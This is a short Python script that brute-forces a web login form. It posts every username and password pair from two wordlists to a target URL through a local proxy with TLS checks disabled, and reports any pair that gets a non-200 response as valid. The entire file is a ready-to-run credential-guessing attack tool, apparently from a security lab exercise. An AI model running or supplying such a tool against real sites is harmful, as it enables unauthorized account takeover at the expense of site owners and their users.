#!/usr/bin/python3

import requests
import urllib3
import sys
import readline
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def exploit(username, password):
    u = open(username, 'r')
    p = open(password, 'r')
    user_Read = u.readlines()
    pass_Read = p.readlines()
    user_nb = 0
    pass_nb = 0
    for user_line in user_Read:                                    
        user_nb = user_nb + 1
        for pass_line in pass_Read:
            pass_nb = pass_nb + 1
            creds = {'username':user_line.strip(),'password':pass_line.strip()}
            x = requests.post(url, data=creds, allow_redirects=False, verify=False, proxies=proxies)
            if x.status_code != 200:
                print('Username is : ',user_line,' And Password is : ', pass_line)
            elif x.status_code == 200:
                continue

if __name__ == '__main__':
    try:
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        exploit(username, password)
    except IndexError:
        print('[-] Usage : %s [URL] [USERNAME_WORDLIST] [PASSWORD_WORDLIST]' % sys.argv[0])
        print('[-] Example : %s http://example.com username.txt password.txt'% sys.argv[0])
        sys.exit(-1)
